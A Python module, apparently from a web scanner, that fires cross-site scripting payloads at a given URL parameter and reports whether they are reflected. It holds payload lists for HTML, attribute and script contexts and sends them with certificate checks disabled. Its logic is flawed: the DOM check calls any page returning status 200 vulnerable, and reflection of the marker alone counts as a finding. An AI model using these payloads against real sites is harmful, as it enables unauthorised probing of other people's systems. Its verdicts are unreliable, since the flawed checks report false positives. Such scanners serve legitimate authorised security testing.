import re
from typing import Optional, List
import requests

XSS_CONTEXT_PATTERNS = {
    "html": [
        r'<([^>]+)>',
        r'<script[^>]*>.*?</script>',
        r'on\w+\s*=',
    ],
    "attr": [
        r'<input[^>]*value=["\']?',
        r'<a[^>]*href=["\']?',
        r'<img[^>]*src=["\']?',
    ],
    "js": [
        r'var\s+\w+\s*=\s*["\']?',
        r'\.innerHTML\s*=',
        r'document\.write\(["\']?',
    ],
}

XSS_PAYLOADS = {
    "html": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ],
    "attr": [
        '" onfocus=alert(1) autofocus="',
        "' onfocus=alert(1) autofocus='",
        '" autofocus onfocus=alert(1)',
        "' autofocus onfocus=alert(1)",
        '" onmouseover=alert(1) "',
    ],
    "js": [
        "';alert(1)//",
        "';alert(1);'",
        '";alert(1)//',
        '";alert(1);"',
        "</script><script>alert(1)</script>",
    ],
}

REFLECTION_MARKERS = ["XSS_TEST_%d" % i for i in range(100, 130)]


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0, post_body: bool = False, post_data: dict = None,
          context: str = "all") -> dict:
    if sess is None:
        sess = requests.Session()
    result = {"vulnerable": False, "type": None, "evidence": [], "confirmed": False}

    contexts = ["html", "attr", "js"] if context == "all" else [context]

    for ctx in contexts:
        payloads = XSS_PAYLOADS.get(ctx, [])
        for i, payload in enumerate(payloads):
            marker = REFLECTION_MARKERS[i % len(REFLECTION_MARKERS)]
            test_payload = marker + payload
            try:
                if post_body and post_data:
                    d = post_data.copy()
                    d[param] = test_payload
                    r = sess.post(url, data=d, timeout=timeout, verify=False)
                else:
                    sep = "&" if "?" in url else "?"
                    r = sess.get("%s%s%s=%s" % (url, sep, param, test_payload),
                                 timeout=timeout, verify=False)
                if marker in r.text:
                    result["vulnerable"] = True
                    result["type"] = "reflected"
                    result["evidence"].append(
                        "reflected %s in %s (%dB)" % (ctx, param, len(r.text)))
                    if "<script>alert(1)</script>" in r.text or "onerror=alert(1)" in r.text:
                        result["confirmed"] = True
                    break
            except:
                pass
        if result["vulnerable"]:
            break

    if not result["vulnerable"]:
        dom_payloads = [
            "javascript:alert(1)",
            "<svg/onload=alert(1)>",
            "';alert(1);//",
        ]
        for payload in dom_payloads:
            try:
                sep = "&" if "?" in url else "?"
                r = sess.get("%s%s%s=%s" % (url, sep, param, payload),
                             timeout=timeout, verify=False)
                if "<script>alert(1)</script>" in r.text or r.status_code == 200:
                    result["vulnerable"] = True
                    result["type"] = "dom"
                    result["evidence"].append("dom: %s" % payload[:30])
                    break
            except:
                pass

    return result
